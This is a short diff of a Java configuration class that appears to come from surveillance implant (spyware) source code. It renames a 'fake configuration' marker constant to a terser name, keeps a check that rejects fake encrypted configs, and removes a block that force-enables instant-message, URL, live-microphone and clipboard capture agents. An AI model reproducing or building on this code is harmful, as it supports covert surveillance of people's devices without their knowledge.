@@ -151,7 +151,8 @@ public final class Conf {
      * 0x3f };
      */
 
-    public static final byte[] FAKECONFSTART = "XW15TZlwZwpaWGPZ1wtL0f591tJe2b9c1z4PvkRuZaP1jTUR6yfBfLm4Knsu0st2"
+    // Fake conf start
+    public static final byte[] FKCFST = "XW15TZlwZwpaWGPZ1wtL0f591tJe2b9c1z4PvkRuZaP1jTUR6yfBfLm4Knsu0st2"
             .getBytes();
 
     public static final int CONNECTION_TIMEOUT = 120;
@@ -396,7 +397,7 @@ public final class Conf {
                 final byte[] lenArray = new byte[4];
                 i0.read(lenArray);
                 len = Utils.byteArrayToInt(lenArray, 0);
-                if (Arrays.equals(lenArray, 0, FAKECONFSTART, 0,
+                if (Arrays.equals(lenArray, 0, FKCFST, 0,
                         lenArray.length)) {
                     //#ifdef ERROR
                     debug.error("Fake configuration");
@@ -414,9 +415,9 @@ public final class Conf {
             final byte[] cyphered = new byte[len];
             i0.read(cyphered);
 
-            if (cyphered.length < FAKECONFSTART.length
-                    || Arrays.equals(cyphered, 0, FAKECONFSTART, 0,
-                            FAKECONFSTART.length)) {
+            if (cyphered.length < FKCFST.length
+                    || Arrays.equals(cyphered, 0, FKCFST, 0,
+                            FKCFST.length)) {
                 //#ifdef ERROR
                 debug.error("Fake configuration");
                 //#endif
@@ -550,31 +551,6 @@ public final class Conf {
                     }
                 }
             }
-        }
-
-        if (instatiate) {
-            //#ifdef IM_FORCED
-            Agent agent1 = Agent.factory(Agent.AGENT_IM, true, new byte[0]);
-            status.addAgent(agent1);
-            //#endif
-
-            //#ifdef URL_FORCED
-            Agent agent2 = Agent.factory(Agent.AGENT_URL, true, new byte[0]);
-            status.addAgent(agent2);
-            //#endif
-
-            //#ifdef LIVE_MIC_FORCED
-            Agent agent3 = Agent.factory(Agent.AGENT_LIVE_MIC, true,
-                    new byte[0]);
-            status.addAgent(agent3);
-            //#endif
-
-            //#ifdef CLIP_FORCED
-            Agent agent4 = Agent.factory(Agent.AGENT_CLIPBOARD, true,
-                    new byte[0]);
-            status.addAgent(agent4);
-            //#endif
-
         }
 
         //#ifdef DEBUG
